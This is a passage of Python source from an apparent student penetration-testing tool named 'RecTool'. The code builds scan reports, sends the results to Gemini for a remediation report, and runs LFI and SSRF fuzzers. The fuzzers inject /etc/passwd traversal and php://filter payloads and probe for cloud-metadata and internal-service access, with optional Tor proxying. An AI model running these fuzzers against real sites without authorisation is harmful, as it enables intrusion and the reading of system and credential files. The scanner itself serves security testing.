                        "type": "Server-Side Request Forgery (SSRF)",
                        "description": vuln_desc,
                        "url": full_url,
                        "vulnerable_parameter": infected_param,
                        "payload": payload
                    })
        except Exception as e:
            print(f"Error parsing SSRF file: {e}")

        return results
    report = {
        "scan_metadata": {
            "target_domain": domain,
            "scan_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "tool": "RecTool - DEPI Project"
        },
        "reconnaissance": {
            "subdomains_count": len(read_lines("finalSubs.txt")),
            "subdomains_list": read_lines("finalSubs.txt"),  # اختياري لو القائمة مش ضخمة
            "urls_crawled_count": len(read_lines("hackrwlerurls.txt")),
            "fuzzing_targets_count": len(read_lines("Parameters.txt"))
        },
        "downloads": {
            "js_files": count_files("js_files"),
            "php_files": count_files("php_files"),
            "json_files": count_files("json_files")
        },
        "vulnerabilities": {
            "sql_injection": parse_sqli_file("vulnerable_sqli.txt"),
            "xss": parse_xss_file("vulnerable_xss.txt"),
            "lfi": parse_lfi_file("lfi_results.txt"),
            "ssrf": parse_ssrf_file("SSRF_results.txt"),
            "info_disclosure": read_lines("info_disclosure_nikto.txt"),

        },
        "technology_stack": parse_cms_file("cms_results.txt"),
        "exploits_detected": parse_cve_file("cve_exploits.txt"),
        "active_cves_verified": read_lines("cve_nuclei_active.txt")
    }


    output_path = os.path.join(place, "Final_Report.json")
    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=4, ensure_ascii=False)
        print(colored(f"[+] Final JSON Report Generated: {output_path}", "green", attrs=['bold']))
        return output_path
    except Exception as e:
        print(colored(f"[-] Error saving JSON: {e}", "red"))
        return None
#######################################
############       AI   ###############
def generate_ai_report(apikey,json_data,place):
    api_key = apikey

    # لو مفيش مفتاح، اخرج بهدوء
    if not api_key:
        print("[!] No Gemini API Key found. Skipping AI Analysis.")
        return

    print("[*] Generative AI is analyzing vulnerabilities...")

    try:
        genai.configure(api_key=api_key)
        model = genai.GenerativeModel('gemini-pro-latest')

        prompt = f"""
        ACT AS A SENIOR CYBERSECURITY CONSULTANT AND PENETRATION TESTER.
        
        YOUR TASK:
        Analyze the provided JSON vulnerability scan data from the tool "RecTool" (DEPI Graduation Project) and generate a world-class, comprehensive penetration test report in Markdown format.

        TARGET AUDIENCE:
        1. Executive Management (High-level risk overview).
        2. Developers & System Admins (Technical remediation and code fixes).

        REPORT STRUCTURE & REQUIREMENTS:

        1. 🚨 EXECUTIVE SUMMARY
           - Provide an overall "Security Score" (0-100) based on findings.
           - Create a Markdown Table summarizing counts: [Critical, High, Medium, Low].
           - Write a short paragraph explaining the business impact (Financial loss, Reputation damage) if these are not fixed.

        2. 🔍 DETAILED VULNERABILITY ANALYSIS (Iterate through findings)
           For each vulnerability found in the JSON:
           - **Title & Severity:** Use emojis (e.g., 🔴 Critical, 🟠 High).
           - **The Location:** Specific URL and Parameter.
           - **The Attack Vector:** Explain HOW the payload works in simple terms.
           - **Business Impact:** What can an attacker actually DO? (e.g., "Dump the entire database", "Access server files").

        3. 🛠️ REMEDIATION & CODE PATCHES (THE MOST IMPORTANT PART)
           - Detect the technology stack from the URLs (e.g., if .php -> provide PHP code, if .py -> Python).
           - **Vulnerable Code Example:** Write a hypothetical snippet of how the code likely looks right now.
           - **Secure Code Patch:** Write the CORRECT, SECURE code using industry best practices (e.g., Prepared Statements for SQLi, Input Sanitization for XSS).
           
        4. 🛡️ DEFENSE IN DEPTH SUGGESTIONS
           - Suggest WAF rules or server configurations (like .htaccess or Nginx config) to block these attacks globally.

        INPUT DATA:
        {json_data}

        OUTPUT FORMAT:
        - Use professional Markdown.
        - Use bolding, lists, and code blocks (` ``` `) extensively.
        - Tone: Urgent but Professional.
        - If the JSON is empty or has no vulnerabilities, write a "Certificate of Clean Health" but suggest general hardening.
        """
        response = model.generate_content(prompt)

        # احفظ النتيجة في فايل جديد
        with open(place+"/AI_Report.md", "w") as f:
            f.write(response.text)

        print("[+] AI Report Generated: AI_Report.md")

    except Exception as e:
        print(f"[!] AI Error: {e}")

###############################################
##############      LFI     ###################
def scan_lfi_nuclei(place, use_tor=False):
    targets_file = f"{place}/Parameters.txt"
    output_file = f"{place}/lfi.txt"

    print(colored(f"\n[+] Starting LFI Scan...", "yellow", attrs=['bold']))

    if not os.path.exists(targets_file):
        print(colored("[-] No targets found (Parameters.txt is missing).", "red"))
        return

    proxy_flag = ""
    if use_tor:
        proxy_flag = " -proxy socks5://127.0.0.1:9050"


    command = f"nuclei -l {targets_file} -tags lfi {proxy_flag} -o {output_file} -silent"

    try:
        subprocess.run(command, shell=True, timeout=300)

        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            print(colored(f"   [!!!] LFI VULNERABILITIES FOUND (Nuclei)!", "red", attrs=['bold']))

            with open(output_file, 'r') as f:
                for line in f:
                    print(colored(f"   └── {line.strip()}", "yellow"))
        else:
            print(colored("   [-] No LFI found by Nuclei.", "white"))

    except subprocess.TimeoutExpired:
        print(colored("   [-] LFI Scan Timed out.", "white"))
    except Exception as e:
        print(colored(f"   [-] Error: {e}", "red"))

SIG_LINUX = "root:x:0:0"
TIMEOUT = 5
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/102.0"
}

# بايلودز احتياطية لو الملف الخارجي مش موجود
DEFAULT_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php"
]

def load_payloads_from_file(file_path):
    """
    بتقرأ البايلودز من ملف خارجي
    """
    if not file_path or not os.path.exists(file_path):
        print(colored(f"[!] Payload file '{file_path}' not found. Using default list.", "yellow"))
        return DEFAULT_PAYLOADS

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            # strip() عشان يشيل المسافات والأسطر الزيادة
            payloads = [line.strip() for line in f if line.strip()]

        print(colored(f"[*] Loaded {len(payloads)} custom payloads from file.", "cyan"))
        return payloads
    except Exception as e:
        print(colored(f"[!] Error reading payload file: {e}", "red"))
        return DEFAULT_PAYLOADS

def generate_malicious_urls(url, payloads_list):
    """
    بتاخد اللينك وقائمة البايلودز وتعمل Fuzzing
    """
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        return []

    malicious_links = []

    for param_name in query_params:
        for payload in payloads_list:
            new_params = query_params.copy()

            # [payload] لأن الـ urlencode بتحتاج القيمة تكون List
            new_params[param_name] = [payload]

            new_query = urlencode(new_params, doseq=True)
            new_parts = list(parsed)
            new_parts[4] = new_query
            full_malicious_url = urlunparse(new_parts)

            malicious_links.append(full_malicious_url)

    return malicious_links

def scan_single_url(target_url):
    """
    الفانكشن اللي بتشتغل جوه الـ Thread
    """
    try:
        req = requests.get(target_url, headers=HEADERS, timeout=TIMEOUT)

        # 1. فحص ملف etc/passwd
        if SIG_LINUX in req.text:
            return (target_url, "System File Access (/etc/passwd)")

        # 2. فحص Base64 (Source Code Disclosure)
        if "php://filter" in target_url and len(req.text) > 100:
            # نتأكد إنه مش مجرد Error Message
            if "<?php" in req.text or (len(req.text) % 4 == 0 and "=" in req.text[-2:]):
                return (target_url, "Potential Source Code Disclosure")

    except:
        pass

    return None

def run_lfi_scan(place, threads=20):
    """
    الفانكشن الرئيسية
    """

    output_file=f"{place}/lfi_results.txt"
    urls_file_path=f"{place}/Parameters.txt"
    current_dir = os.path.dirname(os.path.abspath(__file__))
    payloads_file_path = os.path.join(current_dir, 'WordLists', 'LFI.txt')
    print(colored(f"\n--- [ LFI Scanner Module ] ---", "yellow", attrs=['bold']))

    # 1. تحميل البايلودز
    # لو بعت None هيستخدم الافتراضي
    current_payloads = load_payloads_from_file(payloads_file_path)

    # 2. قراءة اللينكات
    if not os.path.exists(urls_file_path):
        print(colored(f"[!] URLs file not found: {urls_file_path}", "red"))
        return

    with open(urls_file_path, 'r') as f:
        urls = [line.strip() for line in f if line.strip()]

    # 3. تجهيز المهام
    tasks = []
    print(colored("[*] Generating attack vectors...", "blue"))

    for url in urls:
        # بنبعت قائمة البايلودز هنا
        infected_links = generate_malicious_urls(url, current_payloads)
        tasks.extend(infected_links)

    if not tasks:
        print(colored("[!] No parameters found to fuzz.", "yellow"))
        return

    print(colored(f"[*] Total Requests: {len(tasks)} | Threads: {threads}", "cyan"))

    # 4. تشغيل الـ Threads
    vulnerabilities = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(scan_single_url, tasks)

        for res in results:
            if res:
                vuln_url, vuln_type = res
                print(colored(f"\n[+] VULNERABILITY FOUND! ({vuln_type})", "red", attrs=['bold']))
                print(colored(f"    URL: {vuln_url}", "white"))

                vulnerabilities.append(f"[{vuln_type}] {vuln_url}")

                with open(output_file, "a") as f:
                    f.write(f"[{vuln_type}] {vuln_url}\n")

    print(colored(f"\n[+] Scan Finished. Found {len(vulnerabilities)} vulnerabilities.", "green"))
    return vulnerabilities
############################################
##############     SSRF       ##############
def load_payloads_from_file(file_path):
    """تحميل البايلودز من ملف خارجي"""
    if not file_path or not os.path.exists(file_path):
        print(colored(f"[!] SSRF Payload file '{file_path}' not found. Using default list.", "yellow"))
        return DEFAULT_PAYLOADS

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            payloads = [line.strip() for line in f if line.strip()]
        print(colored(f"[*] Loaded {len(payloads)} custom SSRF payloads.", "cyan"))
        return payloads
    except Exception as e:
        print(colored(f"[!] Error reading payload file: {e}", "red"))
        return DEFAULT_PAYLOADS


def generate_ssrf_vectors(url, payloads_list):
    """حقن البايلودز داخل البراميترات"""
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        return []

    vectors = []

    for param_name in query_params:
        for payload in payloads_list:
            new_params = query_params.copy()
            # استبدال القيمة بالكامل بالرابط الخبيث
            new_params[param_name] = [payload]

            new_query = urlencode(new_params, doseq=True)
            new_parts = list(parsed)
            new_parts[4] = new_query
            full_url = urlunparse(new_parts)

            vectors.append(full_url)

    return vectors


def scan_single_url(target_url):
    """فحص الرابط ومحاولة اكتشاف استجابة السيرفر الداخلي"""
    try:
        req = requests.get(target_url, headers=HEADERS, timeout=TIMEOUT, allow_redirects=False)
        content = req.text

        # 1. AWS Metadata Leak
        if "ami-id" in content or "instance-id" in content:
            if "169.254" in target_url:
                return (target_url, "SSRF (AWS Metadata Leak)")

        # 2. Local File Access (File Protocol)
        if "root:x:0:0" in content and "file://" in target_url:
            return (target_url, "SSRF (Local File Read)")

        # 3. Google Cloud Metadata
        if "computeMetadata" in target_url and "Google" in req.headers.get("Metadata-Flavor", ""):
            return (target_url, "SSRF (GCP Metadata Leak)")

        # 4. Open Ports / Internal Services (SSH Banner usually)
        if "SSH-" in content and "dict://" in target_url:
            return (target_url, "SSRF (Internal Port Scan)")

        # 5. Localhost detection (Generic)
        # دي صعبة شوية لانها بتعتمد على اختلاف الصفحة، بس ممكن نشيك على كلمات مشهورة
        if "localhost" in target_url or "127.0.0.1" in target_url:
            if "Apache 2 Test Page" in content or "It works!" in content:
                return (target_url, "SSRF (Localhost Access)")

    except requests.exceptions.Timeout:
        # أحيانا التايم أوت معناه انه حاول يتصل ب IP داخلي ومردش، دي علامة Blind SSRF بس صعبة التحديد
        pass
    except:
        pass

    return None


def run_ssrf_scan(place, threads=20):
    print(colored(f"\n--- [ SSRF Scanner Module ] ---", "yellow", attrs=['bold']))
    output_file = f"{place}/SSRF_results.txt"
    urls_file_path = f"{place}/Parameters.txt"
    current_dir = os.path.dirname(os.path.abspath(__file__))
    payloads_file_path = os.path.join(current_dir, 'WordLists', 'SSRF.txt')
    # تحميل البايلودز
    current_payloads = load_payloads_from_file(payloads_file_path)

    # قراءة الروابط
    if not os.path.exists(urls_file_path):
        print(colored(f"[!] URLs file not found: {urls_file_path}", "red"))
        return

    with open(urls_file_path, 'r') as f:
        # يفضل هنا تستخدم دالة smart_filter_urls اللي عملناها المرة اللي فاتت
        urls = [line.strip() for line in f if line.strip()]

    # تجهيز المهام
    tasks = []
    print(colored("[*] Generating SSRF vectors...", "blue"))

    for url in urls:
        vectors = generate_ssrf_vectors(url, current_payloads)
        tasks.extend(vectors)

    if not tasks:
        print(colored("[!] No parameters found to test for SSRF.", "yellow"))
        return

    print(colored(f"[*] Total Requests: {len(tasks)} | Threads: {threads}", "cyan"))

    # التشغيل
    vulnerabilities = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(scan_single_url, tasks)

        for res in results:
            if res:
                vuln_url, vuln_type = res
                print(colored(f"\n[+] VULNERABILITY FOUND! ({vuln_type})", "red", attrs=['bold']))
                print(colored(f"    URL: {vuln_url}", "white"))

                vulnerabilities.append(f"[{vuln_type}] {vuln_url}")

                with open(output_file, "a") as f:
                    f.write(f"[{vuln_type}] {vuln_url}\n")

    print(colored(f"\n[+] SSRF Scan Finished. Found {len(vulnerabilities)} vulnerabilities.", "green"))
    return vulnerabilities